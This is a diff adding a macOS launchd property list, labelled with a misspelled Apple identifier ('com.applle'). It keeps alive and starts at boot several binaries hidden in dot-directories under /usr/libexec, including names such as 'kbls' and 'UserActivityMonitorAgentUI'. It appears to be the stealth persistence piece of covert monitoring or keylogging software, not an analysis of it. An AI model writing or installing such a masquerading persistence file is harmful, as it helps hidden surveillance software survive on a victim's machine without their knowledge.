@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>EnableTransactions</key>
+	<true/>
+	<key>KeepAlive</key>
+	<true/>
+	<key>Label</key>
+	<string>com.applle.blblw.plist</string>
+	<key>Nice</key>
+	<integer>10</integer>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/usr/libexec/.blblw/blblw</string>
+		<string>/usr/libexec/.blblu/blblu/Contents/MacOS/blblu</string>
+		<string>blblu</string>
+		<string>blblu-load-all</string>
+		<string>/usr/libexec/.blblu/blblu/Contents/Resources/kbls.app/Contents/MacOS/kbls</string>
+		<string>kbls</string>
+		<string>kbls-load-all</string>
+		<string>blbld</string>
+		<string>UserActivityMonitorAgentUI</string>
+		<string>/usr/libexec/.blblu/blblu/Contents/Resources/Uninstall.sh</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+</dict>
+</plist>
